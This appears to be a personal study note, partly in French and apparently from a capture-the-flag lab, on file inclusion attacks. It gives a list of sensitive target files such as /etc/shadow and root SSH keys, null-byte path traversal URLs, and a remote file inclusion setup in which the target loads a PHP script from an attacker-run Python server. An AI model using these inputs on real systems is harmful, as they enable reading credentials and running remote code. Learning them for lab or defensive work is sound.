# **File Inclusion**

---

## **Introduction**

![](images/fileinclusion.png)

---

## **Path Traversal**

![](images/directory.png)

| Location                    | Desc                                                                                                                                                              |
| --------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| /etc/issue                  | contains a message or system identification to be printed before the login prompt                                                                                 |
| /etc/profile                | controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived |
| /proc/version               | specifies the version of the Linux kernel                                                                                                                         |
| /etc/passwd                 | has all registered user that has access to a system                                                                                                               |
| /etc/shadow                 | contains information about the system's users' passwords                                                                                                          |
| /root/.bash_history         | contains the history commands for root user                                                                                                                       |
| /var/log/dmessage           | contains global system messages, including the messages that are logged during system startup                                                                     |
| /var/mail/root              | all emails for root user                                                                                                                                          |
| /root/.ssh/id_rsa           | Private SSH keys for a root or any known valid user on the server                                                                                                 |
| /var/log/apache2/access.log | the accessed requests for Apache  webserver                                                                                                                       |
| C:\boot.ini                 | contains the boot options for computers with BIOS firmware                                                                                                        |

## **%00 Byte**

Using null bytes is an injection technique where URL-encoded representation such as %00 or 0x00 in hex with user-supplied data to terminate strings.

You could think of it as trying to trick the web app into disregarding whatever comes after the Null Byte.

There are two possible methods to bypass the filter.

First, by using the NullByte %00 or the current directory trick at the end of the filtered keyword /.

The exploit will be similar to <http://webapp.thm/index.php?lang=/etc/passwd/>. We could also use <http://webapp.thm/index.php?lang=/etc/passwd%00>.

---

## **Remote File Inclusion - RFI**

![](images/RFI.png)

pour faire ca facilement creer un mini server http avec python

```bash
python -m http.server 8000
```

Ensuite creer le script qu'on veut faire tourner en .php .js .cequetuveux

ensuite rentrer dans l'URL apres file :

```bash
http://[Ton_IP]:8000/Desktop/hello.php
```
